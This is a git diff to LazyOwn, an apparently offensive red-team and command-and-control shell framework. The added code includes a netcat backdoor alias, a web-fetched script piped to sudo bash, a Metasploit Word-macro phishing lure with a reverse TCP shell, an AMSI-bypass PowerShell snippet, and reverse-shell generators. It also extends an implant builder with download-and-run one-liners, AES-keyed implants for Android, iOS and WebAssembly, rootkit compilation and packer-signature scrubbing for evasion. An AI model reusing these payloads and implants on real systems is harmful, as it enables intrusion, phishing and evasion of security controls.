@@ -91,6 +91,7 @@ class LazyOwnShell(cmd2.Cmd):
 
     rhost = config.rhost
     lhost = config.lhost
+    lport = config.lport
 
     aliases = {
         "available_filter_functions": "sh sudo cat /sys/kernel/tracing/available_filter_functions",
@@ -101,6 +102,7 @@ class LazyOwnShell(cmd2.Cmd):
         "auto": "pyautomate",
         "aslr": "run lazyaslrcheck",
         "asm": "sh /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb",
+        "backdoor": f"sh rlwrap --always-readline nc {rhost} 31337",
         "caja": "sh caja sessions",
         "chown": "sh sudo -s chown 1000:1000 . -R",
         "control_dynamic_debug": "sh sudo cat /sys/kernel/debug/dynamic_debug/control", 
@@ -127,7 +129,9 @@ class LazyOwnShell(cmd2.Cmd):
         "halt": "sh sudo shutdown -h now",
         "hash": "sh cat sessions/hash*",
         "hosts": "sh sudo nano /etc/hosts",
+        "iasniff": "sys sudo python3 modules/ia_network_analysis.py --mode console",
         "info": "sh echo \"<?php phpinfo(); ?>\" > sessions/info.php",
+        "install_shark": 'sys cd external/.exploit/shark && sudo wget -qO- https://github.com/Bhaviktutorials/shark/raw/master/setup | sudo bash',
         "ipy": "sh ipython3",
         "loot": "sh ls /home/$USER/.msf4/loot/ && cp /home/$USER/.msf4/loot/* ./sessions/ -r",
         "ls": "list",
@@ -148,9 +152,12 @@ class LazyOwnShell(cmd2.Cmd):
         "q": "exit",
         "qq": "run_script \"/home/grisun0/LazyOwn/lazyscripts/lazyquit.ls\"",
         "rtpflood" : "sh sudo bash modules/lazyrtpflood.sh",
+        "rustrevmakerwin": f"sh cd sessions ; bash ../modules_ext/rustrevmaker/RustRevMaker.sh windows {lhost} {lport}",
+        "rustrevmakerlin": f"sh cd sessions ; bash ../modules_ext/rustrevmaker/RustRevMaker.sh linux {lhost} {lport}",
         "t": "sh python3 modules/lazypyautogui.py",
         "tcpdump":"sh sudo tcpdump -np 'tcp[tcpflags] ^ (tcp-syn|tcp-ack) == 0'",
         "tcpdumpl":"sh sudo tcpdump -npAq -s0 'tcp and (ip[2:2] > 60)'",
+        "tcpdumpt":"sh sudo tcpdump -np -i tun0 'tcp[tcpflags] ^ (tcp-syn|tcp-ack) == 0'",
         "tor": "sh sudo bash sessions/tor.sh",
         "trace": "sh sudo cat /sys/kernel/tracing/trace",
         "touched_functions": "sh sudo cat /sys/kernel/tracing/touched_functions",
@@ -161,6 +168,8 @@ class LazyOwnShell(cmd2.Cmd):
         "status": "sh git status",
         "stop_squid": "sh sudo systemctl stop squid",
         "start_squid": "sh sudo systemctl start squid",
+        "start_ollama": "sh sudo systemctl start ollama",
+        "stop_ollama": "sh sudo systemctl stop ollama",
         "stop_apt": "sh sudo systemctl stop apt-cacher-ng",
         "start_apt": "sh sudo systemctl start apt-cacher-ng",
         "update": "sh git pull origin main",
@@ -169,6 +178,7 @@ class LazyOwnShell(cmd2.Cmd):
         "vmallocinfo": "sh sudo cat /proc/vmallocinfo",
         "vuln": 'sh echo "    \033[33m[!] Searchspoit\n    \033[34m[!] The Exploit of the Day (you can use the command: cp path/of/exploit to copy exploit to working sessions directory):\033[32m" ;     searchsploit --cve | shuf -n 1 ',
         "wps": "sh sudo bash modules/lazywps.sh",
+        "word": f"sh msfconsole -x 'use exploit/multi/fileformat/office_word_macro ; set payload windows/shell/reverse_tcp ; set FILENAME imagenes_novia.docm ; set BODY Hola_este_en_realidad_eres_tu ; set lhost {lhost} ; set lport {lport} ; exploit ; exit -y ' ; msfconsole -x 'use multi/handler ; set lport {lport} ; set lhost {lhost} ; run' ",
         "ww": "whatweb",
         "zrc": "sh nano ~/.zshrc",
     }
@@ -2996,8 +3006,8 @@ class LazyOwnShell(cmd2.Cmd):
             )
             return
         print_msg(f"Try cp {exploitdb}{line} {path}/sessions/{RESET}")
-        self.cmd(f"cp {exploitdb}{line} {path}/sessions/")
-        self.cmd(f"searchsploit {line} -p")
+        os.system(f"cp {exploitdb}{line} {path}/sessions/")
+        os.system(f"searchsploit {line} -p")
         return
 
     def do_dnsenum(self, line):
@@ -5852,6 +5862,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN Enum AV folder protected","& \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -Scan -ScanType 3 -File \"C:\\folder_to_check\|*\""),
             ("WIN Force Install", "Set __COMPAT_LAYER=RunAsInvoker ; Start Shell64.exe"),
             ("WIN IP Configuration", "ipconfig /all"),
+            ("WIN Disable AMSI", "$AmsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') \\n $AmsiInitFailed = $AmsiUtils.GetField('amsiInitFailed', 'NonPublic,Static') \\n $AmsiInitFailed.SetValue($null,$true)"),
             ("WIN Crear Instantánea:C", 'vssadmin CREATE SHADOW /For=C: \r\n cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit c:\\NTDS.dit'),
             ("WIN copy sam1", "reg.exe save hklm\sam C:\sam.save"),
             ("WIN copy sam2", "reg.exe save hklm\system C:\system.save"),
@@ -5895,9 +5906,9 @@ class LazyOwnShell(cmd2.Cmd):
             if 0 <= choice < len(filtered_commands):
                 selected_alias, selected_cmd = filtered_commands[choice]
                 if selected_cmd: 
-                    confirm = input(f"   [?] Do you want to execute the command: {selected_cmd}? (y/n): ").strip().lower()
+                    confirm = input(f"   [?] Do you want to execute the command: {selected_cmd}? l to local, r to remote, or n to no exec (l/r/n): ").strip().lower() or 'n'
                     
-                    if confirm == 'y':
+                    if confirm == 'l':
                         print_warn(f"Executing command: {selected_cmd}")
                         subprocess.run(selected_cmd + " 2>/dev/null", shell=True)
                         
@@ -5907,6 +5918,16 @@ class LazyOwnShell(cmd2.Cmd):
                         )
                         command_clipboard.communicate(input=selected_cmd.encode())
                         print_msg(f"Command copied to clipboard: {selected_cmd}")
+                    if confirm == 'r':
+                        print_warn(f"Executing command: {selected_cmd}")
+                        user = self.c2_clientid
+                        self.issue_command_to_c2(selected_cmd, user)
+                        command_clipboard = subprocess.Popen(
+                            ['xclip', '-selection', 'clipboard'],
+                            stdin=subprocess.PIPE
+                        )
+                        command_clipboard.communicate(input=selected_cmd.encode())
+                        print_msg(f"Command copied to clipboard: {selected_cmd}")                        
                     else:
                         print_warn("Command execution cancelled.")
                         command_clipboard = subprocess.Popen(
@@ -5954,6 +5975,37 @@ class LazyOwnShell(cmd2.Cmd):
             return
 
         self.cmd(f"{line}")
+        return
+
+    def do_sys(self, line):
+        """
+        Executes a shell command directly from the LazyOwn interface.
+
+        This function allows the user to execute arbitrary shell commands without exiting the LazyOwn shell. 
+        It checks if a command is provided, prints a message indicating the command being executed, and then 
+        runs the command using `os.system`.
+
+        Usage:
+            sh <command>
+
+        :param line: The shell command to be executed.
+        :type line: str
+        :raises ValueError: If no command is provided, an error message is printed indicating that a command is required.
+        :returns: None
+
+        Example:
+            sh ls -la
+            # This will execute 'ls -la' in the shell without exiting LazyOwn.
+
+        Note:
+            Ensure that the command provided is safe to execute and does not include potentially harmful operations.
+
+        """
+        if not line:
+            print_error(f"You must pass the command linke argument")
+            return
+
+        os.system(f"{line}")
         return
 
     def do_pwd(self, line):
@@ -7778,6 +7830,7 @@ class LazyOwnShell(cmd2.Cmd):
             'download_resources.sh',
             'implant',
             'ip2asn-v4.tsv.gz',
+            'key.aes',
             'LazyOwn_session_report.csv',
             'lin',
             'logs',
@@ -10007,9 +10060,13 @@ class LazyOwnShell(cmd2.Cmd):
         rootkit_c = f"{path}/modules/rootkit/mrhyde.c"
         file_evil = f"{path}/modules/evilhttprev.sh"
         filer = f"{path}/modules/r.sh"
-        gofile = f"{path}/sessions/implant/implant.go"
+        gofile = f"{path}/sessions/implant/implant_crypt.go"
         payload_sh = f"{path}/sessions/lin/payload.sh"
         gofile2 = f"{path}/sessions/implant/listener.go"
+        gofile3 = f"{path}/sessions/implant/server.go"
+        gofile4 = f"{path}/sessions/implant/monrevlin.go"
+        server_go = f"{path}/sessions/server.go"
+        monrevlin = f"{path}/sessions/monrevlin.go"
         implantgo = f"{path}/sessions/{line}"
         implantgo2 = f"{path}/sessions/l_{line}"
         implant_config_json = f"{path}/sessions/implant_config_{line}.json"
@@ -10026,7 +10083,7 @@ class LazyOwnShell(cmd2.Cmd):
         random_string = base64_encoded.decode('utf-8')[:12]
         working_dir = f"{path}/sessions/"
         if not choice:
-            choice = input("    [!] choice target windows 1, linux 2, windows bat 3, mac 4 (default 1) : ") or '1'
+            choice = input("    [!] choice target windows 1, linux 2, windows bat 3, mac 4, android 5, IOS 6, WebAssembly 7 (default 1) : ") or '1'
 
         if choice == '1':
             payload = f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/w -OutFile z.ps1 ; .\\z.ps1`\"\""
@@ -10034,7 +10091,7 @@ class LazyOwnShell(cmd2.Cmd):
             platform = "windows"
             user_agent = user_agent_win
         elif choice == '2':
-            payload = f"curl http://{lhost}/r -o r && sh r"
+            payload = f"curl http://{lhost}/payload.sh -o /tmp/p && sh /tmp/p"
             copy2clip(payload)
             platform = "linux"
             user_agent = user_agent_lin
@@ -10047,7 +10104,23 @@ class LazyOwnShell(cmd2.Cmd):
             payload = f"curl http://{lhost}/r -o r && sh r"
             copy2clip(payload)
             platform = "darwin"
-            user_agent = user_agent_win    
+            user_agent = user_agent_win
+        elif choice == '5':
+            payload = f"curl http://{lhost}/r -o r && sh r"
+            copy2clip(payload)
+            platform = "android"
+            user_agent = user_agent_lin
+        elif choice == '6':
+            payload = f"curl http://{lhost}/r -o r && sh r"
+            copy2clip(payload)
+            platform = "ios"
+            user_agent = user_agent_lin
+
+        elif choice == '7':
+            payload = f"curl http://{lhost}/r -o r && sh r"
+            copy2clip(payload)
+            platform = "webassembly"
+            user_agent = user_agent_lin                        
         if not check_lhost(lhost):
             return
 
@@ -10095,10 +10168,10 @@ class LazyOwnShell(cmd2.Cmd):
         rootkit_content = rootkit_content.replace("{line}", line)
         mrhyde_content = mrhyde_content.replace("{line}", line).replace("{lhost}", lhost)
         server = f"python3 -W ignore lazyc2.py {lport} {USER} {PASS}"
-        
+        with open(f"{path}/sessions/key.aes", 'rb') as f:
+            AES_KEY = f.read()
         with open(f"{path}/sessions/mrhyde.c", 'w+') as f:
             f.write(rootkit_content)
-
         with open(f"{path}/sessions/mrhydew.c", 'w+') as f:
             f.write(mrhyde_content)
 
@@ -10151,7 +10224,16 @@ class LazyOwnShell(cmd2.Cmd):
         with open(gofile2, 'r') as f:
             lcontent = f.read()
 
-        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent)
+        with open(gofile3, 'r') as f:
+            lateral_content = f.read()
+
+        with open(gofile4, 'r') as f:
+            monrevlin_content = f.read()
+
+        AES_KEY_hex = AES_KEY.hex()
+        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
+        monrevlin_content = monrevlin_content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
+        lateral_content = lateral_content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
         lcontent = lcontent.replace("{lport}", str(rport)).replace("{lhost}", lhost).replace("{listener}", listener)
         implant_go = implantgo + ".go"
         implant_go2 = implantgo + "_l.go"
@@ -10163,18 +10245,29 @@ class LazyOwnShell(cmd2.Cmd):
         
         with open(f"{implant_go2}", 'w+') as f:
             f.write(lcontent)
-        
+
+        with open(f"{server_go}", 'w+') as f:
+            f.write(lateral_content)
+
+        with open(f"{monrevlin}", 'w+') as f:
+            f.write(monrevlin_content)    
+
         if platform == "linux":
             binary = line
             compile_command = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
             compile_command2 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
+            compile_command3 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -o sessions/server_{binary} {server_go}"
+            compile_command4 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -o sessions/monrevlin {monrevlin}"
             command_mon = f"gcc -o {self.sessions_dir}/monrev {self.sessions_dir}/mr.c -lpthread  -lssl -lcrypto"
             command_rootkit = f"gcc -fPIC -shared -o {rootkit} -ldl {path}/sessions/mrhyde.c"
-
+            cplib = 'cp /lib/x86_64-linux-gnu/libc.so.6 sessions/ && cp /lib64/ld-linux-x86-64.so.2 sessions/'
             self.cmd(command_rootkit)
             self.cmd(command_mon)
             self.cmd(compile_command)
-            self.cmd(compile_command2)            
+            self.cmd(compile_command2)
+            self.cmd(compile_command3)
+            self.cmd(compile_command4)
+            self.cmd(cplib)
             self.onecmd(f"service {line}")
             self.onecmd(f"service l_{line}")
             ofuscate = f"cd sessions && base64 payload.sh | (echo -n '#!/bin/bash\\necho \"' ; cat - ; echo '\" | base64 -d | bash') | sponge payload.sh"
@@ -10192,11 +10285,13 @@ class LazyOwnShell(cmd2.Cmd):
             cmd_anti_upx = 'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})UPX!.{4}/$1$2\\0\\0\\0\\0\\0\\0\\0\\0/s\' "monrev"'
             cmd_ant_elf = 'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})\\x7fELF/$1$2\\0\\0\\0\\0/s\' "monrev"'
             self.cmd(cmd_anti_upx) 
-            self.cmd(cmd_ant_elf)             
+            self.cmd(cmd_ant_elf)
+
         elif platform == "windows":
             binary = f"{line}.exe"
             compile_command = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
             compile_command2 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
+            compile_command3 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o server_{binary} {server_go}"
             compile_cw = f"x86_64-w64-mingw32-gcc -o sessions/b{line}.exe sessions/wmr.c -lws2_32 -lwininet"
             command_mrhyde = f"x86_64-w64-mingw32-gcc -shared -o {path}/sessions/mrhyde.dll {path}/sessions/mrhydew.c -lkernel32 -luser32 -ladvapi32"
             print_msg(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/{implant_go} -OutFile {implant_go} ; .\\{implant_go}`\"\"")
@@ -10207,21 +10302,68 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(command_mrhyde)
             self.cmd(compile_command)
             self.cmd(compile_command2)
+            self.cmd(compile_command3)
             upx = f"upx {self.sessions_dir}/{binary}"
             self.cmd(upx)
             upx = f"upx {self.sessions_dir}/b{binary}"
-            self.cmd(upx)            
+            self.cmd(upx)
+
         elif platform == "darwin":
             binary = line
             compile_command = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
             compile_command2 = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
+            compile_command3 = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -o server_{binary} {server_go}"
             print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
             print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")
 
             self.cmd(compile_command)
             self.cmd(compile_command2)
+            self.cmd(compile_command3)
             upx = f"upx {self.sessions_dir}/{binary}"
             self.cmd(upx)
+
+        elif platform == "android":
+            binary = line
+            compile_command = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 go build -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            compile_command2 = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 go build -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
+            compile_command3 = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 go build -ldflags=\"-s -w\" -o server_{binary} {server_go}"
+            print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
+            print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")
+
+            self.cmd(compile_command)
+            self.cmd(compile_command2)
+            self.cmd(compile_command3)
+            upx = f"upx {self.sessions_dir}/{binary}"
+            self.cmd(upx)
+
+        elif platform == "ios":
+            binary = line
+            compile_command = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 go build -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            compile_command2 = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 go build -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
+            compile_command3 = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 go build -ldflags=\"-s -w\" -o server_{binary} {server_go}"
+            print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
+            print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")
+
+            self.cmd(compile_command)
+            self.cmd(compile_command2)
+            self.cmd(compile_command3)
+            upx = f"upx {self.sessions_dir}/{binary}"
+            self.cmd(upx)
+
+        elif platform == "webassembly":
+            binary = line
+            compile_command = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm go build -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            compile_command2 = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm go build -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
+            compile_command3 = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm go build -ldflags=\"-s -w\" -o server_{binary} {server_go}"
+            print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
+            print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")
+
+            self.cmd(compile_command)
+            self.cmd(compile_command2)
+            self.cmd(compile_command3)
+            upx = f"upx {self.sessions_dir}/{binary}"
+            self.cmd(upx)                    
+
         print_msg(f"Go agent {implantgo} compiled successfully.")
         md5 = f"md5sum {self.sessions_dir}/{binary}"
         md5sum = self.cmd(md5)
@@ -21787,7 +21929,8 @@ class LazyOwnShell(cmd2.Cmd):
             ("linux-elf-runtime-crypter", "https://www.guitmz.com/linux-elf-runtime-crypter/"),
             ("Binary download", "https://bin.ajam.dev/"),
             ("cryptpad","https://cryptpad.fr/"),
-            ("kycnot","https://kycnot.me/")
+            ("kycnot","https://kycnot.me/"),
+            ("socks proxy list","https://spys.one/en/socks-proxy-list/")
 
 
 
@@ -23370,8 +23513,14 @@ class LazyOwnShell(cmd2.Cmd):
         if os.path.exists(redop_file):
             with open(redop_file, 'r') as f:
                 session_data["redop"] = f.read().strip()         
-        with open(session_file, 'w') as f:
-            json.dump(session_data, f, indent=4)
+        try: 
+            with open(session_file, 'w') as f:
+                json.dump(session_data, f, indent=4)
+        except Exception as e:
+      
+            with open(session_file, 'w') as f:
+                json.dump(session_data, f, indent=4)
+
         self.onecmd("load_session")
     def do_shellcode2elf(self, line):
         """
@@ -24251,6 +24400,61 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(ssh_install)
         return
 
+    def do_commix(self, line):
+        """
+        Executes the Commix tool for detecting and exploiting command injection vulnerabilities.
+
+        This function:
+            - Installs Commix if not already installed.
+            - Executes the Commix command with the provided parameters.
+            - Displays the result in the terminal.
+
+        Behavior:
+            - Requires `git` and `python` to be installed.
+            - Uses a one-liner installation method for simplicity.
+
+        Usage:
+            commix {url} {field} {value}
+        """
+        path = os.getcwd()
+        commix_repo = "https://github.com/commixproject/commix.git"
+        commix_path = os.path.join(path, "external", ".exploit", "commix")
+        commix_path = path + "/" + commix_path
+
+        try:
+            if not os.path.exists(commix_path):
+                print_msg("Commix is not installed. Installing...")
+                self.cmd(f"git clone {commix_repo} {commix_path}")
+
+            parts = line.split()
+            url = parts[0] if len(parts) > 0 else self.params.get('url')
+            field = parts[1] if len(parts) > 1 else 'file'
+            value = parts[2] if len(parts) > 2 else 'test'
+
+            if not url:
+                print_error("URL is required.")
+                return
+
+            command = f"python {os.path.join(commix_path, 'commix.py')} -u {url} --data=\"{field}={value}\""
+            print_msg(f"Executing: {command}")
+            self.cmd(command)
+
+        except Exception as e:
+            print_error(f"Error: {e}")
+
+    def do_addcli(self, line):
+        """
+        Add a client to execute c2 commands
+        
+        Parameters:
+            line (str): The command line input, which is not used in this function.
+
+        Returns:
+            None
+        """
+        if not line:
+            line = input("    [!] Enter the client_id (default: no_priv): ") or 'no_priv'
+        self.c2_clientid = line.strip()
 
 if __name__ == "__main__":
     p = LazyOwnShell()
